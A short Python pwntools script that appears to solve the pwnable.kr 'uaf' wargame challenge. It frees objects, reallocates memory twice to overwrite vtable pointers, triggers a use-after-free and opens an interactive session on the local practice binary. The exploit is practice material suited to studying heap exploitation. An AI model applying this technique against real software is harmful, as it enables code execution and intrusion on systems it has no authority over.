#!/usr/bin/python

from pwn import *

r = process(['/home/user/pwnable.kr/uaf/uaf', '4' , '/tmp/c'])

# recv three options
r.recvline(timeout=1)
r.recvline(timeout=1)
r.recvline(timeout=1)

# delete objects
print "[+] deleting objects"
r.sendline(str(3))
r.recvline(timeout=1)
r.recvline(timeout=1)
r.recvline(timeout=1)

# overwrite vtable pointer
print "[+] overwriting 1st vtable ptr"
r.sendline(str(2))
r.recvline(timeout=1)
r.recvline(timeout=1)
r.recvline(timeout=1)

# overwrite vtable pointer
print "[+] overwriting 2nd vtable ptr"
r.sendline(str(2))
r.recvline(timeout=1)
r.recvline(timeout=1)
r.recvline(timeout=1)

# use after free
print "[+] triggering uaf"
r.sendline(str(1))
r.interactive()
